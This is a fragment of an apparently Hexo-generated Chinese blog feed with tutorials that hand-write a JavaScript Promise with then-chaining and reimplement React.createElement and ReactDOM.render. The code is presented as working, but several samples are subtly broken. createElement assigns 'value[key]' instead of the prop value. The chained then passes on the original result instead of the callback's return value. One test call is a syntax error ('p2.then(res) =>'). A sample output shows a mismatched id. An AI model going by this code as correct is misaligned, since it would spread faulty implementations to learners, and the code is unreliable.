<span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.rejectedEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(reason);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executor(resolve, reject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.state === <span class="string">&quot;resolved&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// 订阅方法</span></span><br><span class="line">            <span class="built_in">this</span>.fulfilledEvent.push(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                onFulfilled(result);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.state === <span class="string">&quot;rejected&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.rejectedEvent.push(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">                onRejected(reason);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以简单测试一下</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;res: &quot;</span>, res);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;err: &quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// data: 100</span></span><br></pre></td></tr></table></figure><h3 id="then-链式调用"><a href="#then-链式调用" class="headerlink" title="then 链式调用"></a>then 链式调用</h3><ul><li><p>当我们连续调用 then 的时候（p1），如果当前 then 中的回调函数执行不返回一个 Promise 实例，那当前的 then（p1） 默认是成功态，然后去发布它的成功事件池子里的方法</p></li><li><p>如果当前 then 中的回调函数执行返回一个 Promise（p2） 实例，那这个 Promise（p2） 实例就会接管（p1）实例的状态，然后去影响（p1）事件池子里的方法发布</p><p>原理：把（p1）的 resolve 和 reject 放到 （p2） 的对应的事件池子里，然后（p2）去发布自己池子里的的方法时，（p1）的 resolve 和 reject 就会执行，从而达到间接的让 （p2）去发布（p1）池子里的方法</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">executor</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.fulfilledEvent = [];</span><br><span class="line">        <span class="built_in">this</span>.rejectedEvent = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> resolve = <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;resolved&quot;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.fulfilledEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(result);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> reject = <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.state !== <span class="string">&quot;pending&quot;</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="built_in">this</span>.state = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.rejectedEvent.forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                        item(reason);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;, <span class="number">0</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            executor(resolve, reject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            reject(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    then(onFulfilled = <span class="function">() =&gt;</span> &#123;&#125;, onRejected = <span class="function">() =&gt;</span> &#123;&#125;) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.fulfilledEvent.push(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> fn = onFulfilled(result);</span><br><span class="line">                fn <span class="keyword">instanceof</span> MyPromise</span><br><span class="line">                    ? fn.then(resolve, reject)</span><br><span class="line">                    : resolve(result);</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="built_in">this</span>.rejectedEvent.push(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> fn = onRejected(reason);</span><br><span class="line">                fn <span class="keyword">instanceof</span> MyPromise</span><br><span class="line">                    ? fn.then(resolve, reject)</span><br><span class="line">                    : resolve(reason);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以简单测试一下</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="number">100</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p2 = p1.then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p1 res: &quot;</span>, res);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            resolve(<span class="number">200</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p1 err: &quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">p2.then(res) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p2 res: &quot;</span>, res);</span><br><span class="line">    &#125;,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;p2 err: &quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// p1 res:  100</span></span><br><span class="line"><span class="comment">// p2 res:  200</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Promise&quot;&gt;&lt;a href=&quot;#Promise&quot; class=&quot;headerlink&quot; title=&quot;Promise&quot;&gt;&lt;/a&gt;Promise&lt;/h2&gt;&lt;h3 id=&quot;了解-Promise&quot;&gt;&lt;a href=&quot;#了解-Promise&quot; class=&quot;headerlink&quot; title=&quot;了解  Promise&quot;&gt;&lt;/a&gt;了解  Promise&lt;/h3&gt;&lt;p&gt;Promise 是一个异步操作返回的对象，用来传递异步操作的消息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以解决的问题&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解决回调地狱问题，不会导致难以维护&lt;/li&gt;
&lt;li&gt;合并多个异步请求，节约时间&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="源码分析" scheme="http://llmysnow.top/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="Promise" scheme="http://llmysnow.top/tags/Promise/"/>
    
    <category term="then链" scheme="http://llmysnow.top/tags/then%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>手撕React.createElement和ReactDOM.render</title>
    <link href="http://llmysnow.top/posts/7e319c36/"/>
    <id>http://llmysnow.top/posts/7e319c36/</id>
    <published>2021-05-06T08:40:10.928Z</published>
    <updated>2021-05-26T01:27:20.394Z</updated>
    
    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install create-react-app -g</span><br><span class="line">create-react-app demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line">yarn start</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li>这时已经新建好了一个 react 项目，接下来 index.js 写入如下代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.log(</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span> <span class="attr">className</span>=<span class="string">&quot;title&quot;</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    hello world</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> &#x27;<span class="attr">red</span>&#x27; &#125;&#125;&gt;</span>cat<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>如下对象就是一个 React 对象，也就是虚拟 DOM</li></ul><p><img data-src="https://img-blog.csdnimg.cn/img_convert/723b629d0e10b5bd476871bed912c40b.png" alt="虚拟dom对象示例"></p><ul><li>接下来我们打开<a href="https://www.babeljs.cn/repl">babel 官网</a>，勾选 <code>react</code> ，粘贴上去。通过 babel 把 jsx 对象转换成 React 中的 createElement 函数</li></ul><p><img data-src="https://img-blog.csdnimg.cn/img_convert/c9c1436f832951ebbe63cb587d77585f.png" alt="babel_react"></p><ul><li>在项目中写入如下代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;h1 id=<span class="string">&quot;h1&quot;</span> className=<span class="string">&quot;title&quot;</span> key=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">    hello world</span><br><span class="line">    &lt;span style=&#123;&#123; <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;&#125;&gt;cat&lt;/span&gt;</span><br><span class="line">  &lt;/h1&gt;,</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>效果图如下：</li></ul><p><img data-src="https://img-blog.csdnimg.cn/img_convert/1e643e0830b8155a555ee3261eed6a4a.png" alt="渲染示例"></p><p><strong>过程：</strong></p><ol><li>通过 babel（babel-preset-react-app）转换成 jsx 对象</li><li>默认会把 createElement 函数执行，得到 JSX 对象（虚拟 DOM 对象）<ul><li>第一个参数：type，后期要创建元素的标签名（或是组件）</li><li>第二个参数：props，属性对象，包含当前元素标签上设置的各个属性及属性值（不设置，props 值是 null）</li><li>第三个以后的参数：children，当前元素的所有子节点（没有写，则不存在这个参数），如果有，有几个就依次传递几个<ul><li>如果是文本节点，则直接传递文本内容</li><li>如果是元素节点，则把元素依次变为 createElement 格式，把执行的返回值，作为参数传递进来</li></ul></li></ul></li><li>ReactDOM.render，把虚拟 DOM 对象转换为真实 DOM 对象</li></ol><h3 id="React-中-createElement-函数"><a href="#React-中-createElement-函数" class="headerlink" title="React 中 createElement 函数"></a>React 中 createElement 函数</h3><p><strong>React.createElement 返回值</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  $$typeof: <span class="built_in">Symbol</span>(react.element),</span><br><span class="line">  key: <span class="literal">null</span>,</span><br><span class="line">  ref: <span class="literal">null</span>,</span><br><span class="line">  <span class="comment">// 存储的是传递给createElement的第一个参数</span></span><br><span class="line">  type: <span class="string">&#x27;h1&#x27;</span>,</span><br><span class="line">  <span class="comment">// 首先会把传递给createElement的属性对象，一项项的赋值给对象的props</span></span><br><span class="line">  props: &#123;</span><br><span class="line">    <span class="comment">// 并且返回对象的prop还包含children，记录当前元素的子节点（可能是一个值&#123;字符串或JSX返回的对象&#125;，如果有多个子节点，则其是一个数组）</span></span><br><span class="line">    children: <span class="string">&#x27;hello world&#x27;</span>,</span><br><span class="line">    className: <span class="string">&#x27;title&#x27;</span>,</span><br><span class="line">    id: <span class="string">&#x27;title&#x27;</span>,</span><br><span class="line">  &#125;, <span class="comment">// 即使没有传递任何属性，也没有任何的子节点，返回对象的props也是一个&#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里需要注意，key 和 ref 虽然都在 props 里，但是这两个不在 props 里添加，而与 props 同级</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">React.createElement = <span class="function"><span class="keyword">function</span> <span class="title">createElement</span>(<span class="params">type, props, ...children</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> len = children.length,</span><br><span class="line">    obj = &#123;</span><br><span class="line">      type,</span><br><span class="line">      props: &#123;&#125;,</span><br><span class="line">      key: <span class="literal">null</span>,</span><br><span class="line">      ref: <span class="literal">null</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 处理传递进来的属性</span></span><br><span class="line">  <span class="keyword">if</span> (props !== <span class="literal">null</span> &amp;&amp; <span class="keyword">typeof</span> props === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">    each(props, <span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="regexp">/^(key|ref)$/</span>.test(key)) &#123;</span><br><span class="line">        obj[key] = value[key]</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      obj.props[key] = value[key]</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// for in 循环性能较差</span></span><br><span class="line">    <span class="comment">/* for (let key in props) &#123;</span></span><br><span class="line"><span class="comment">      if (!props.hasOwnProperty(key)) break</span></span><br><span class="line"><span class="comment">      if (/^(key|ref)$/.test(key)) &#123;</span></span><br><span class="line"><span class="comment">        obj[key] = props[key]</span></span><br><span class="line"><span class="comment">        continue</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">      obj.props[key] = props[key]</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 处理子节点</span></span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    obj.props.children = len === <span class="number">1</span> ? children[<span class="number">0</span>] : children</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>由于 <code>for...in...</code> 循环性能较差，这里稍微优化一下（封装一个 each 方法）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> each = <span class="function"><span class="keyword">function</span> <span class="title">each</span>(<span class="params">obj, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj == <span class="literal">null</span> || <span class="keyword">typeof</span> obj !== <span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;obj must be an object&#x27;</span>)</span><br><span class="line">  <span class="keyword">let</span> keys = <span class="built_in">Object</span>.keys(obj),</span><br><span class="line">    key,</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">Symbol</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    keys = keys.concat(<span class="built_in">Object</span>.getOwnPropertySymbols(obj))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (; i &lt; keys.length; i++) &#123;</span><br><span class="line">    key = keys[i]</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      callback(obj[key], key)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ReactDOM-中-render-函数"><a href="#ReactDOM-中-render-函数" class="headerlink" title="ReactDOM 中 render 函数"></a>ReactDOM 中 render 函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ReactDOM.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">obj, container, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; type, props &#125; = obj,</span><br><span class="line">    element</span><br><span class="line">  <span class="comment">// 核心思想：动态创建指定类型的元素，插入到指定容器当中</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> type === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    element = <span class="built_in">document</span>.createElement(type)</span><br><span class="line">    each(props, <span class="function">(<span class="params">value, key</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (key === <span class="string">&#x27;className&#x27;</span>) &#123;</span><br><span class="line">        element.setAttribute(<span class="string">&#x27;class&#x27;</span>, value)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (key === <span class="string">&#x27;style&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 把style对象中的每一项分别给元素设置样式 value:style对象</span></span><br><span class="line">        each(value, <span class="function">(<span class="params">item, attr</span>) =&gt;</span> &#123;</span><br><span class="line">          element.style[attr] = item</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (key === <span class="string">&#x27;children&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 肯定有子节点 value:children属性值</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(value)) value = [value] <span class="comment">// 让它都是数组</span></span><br><span class="line">        value.forEach(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// item每个子节点</span></span><br><span class="line">          <span class="comment">// 1.文本子节点：直接创建一个文本节点，插入到element中</span></span><br><span class="line">          <span class="comment">// 2.元素子节点：新的jsx对象（createElement），我们需要把它也创建成为一个元素标签，插入到element中即可</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">typeof</span> item === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> textNode = <span class="built_in">document</span>.createTextNode(item)</span><br><span class="line">            element.appendChild(textNode)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 递归处理</span></span><br><span class="line">          render(item, element)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      element.setAttribute(key, value)</span><br><span class="line">    &#125;)</span><br><span class="line">    container.appendChild(element)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">      callback()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果type是一个组件，有不同的处理方案</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install create-react-app -g&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;create-react-app demo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; demo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yarn start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="React" scheme="http://llmysnow.top/categories/React/"/>
    
    
    <category term="源码分析" scheme="http://llmysnow.top/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="React" scheme="http://llmysnow.top/tags/React/"/>
    
    <category term="createElement" scheme="http://llmysnow.top/tags/createElement/"/>
    
    <category term="render" scheme="http://llmysnow.top/tags/render/"/>
    
  </entry>
  
  <entry>
    <title>Vue+Element 国际化(i18n)页面全覆盖（路由、表单检验、弹出框等）</title>
    <link href="http://llmysnow.top/posts/82482c19/"/>
    <id>http://llmysnow.top/posts/82482c19/</id>
    <published>2021-05-06T08:38:25.955Z</published>
    <updated>2021-08-10T01:51:01.902Z</updated>
    
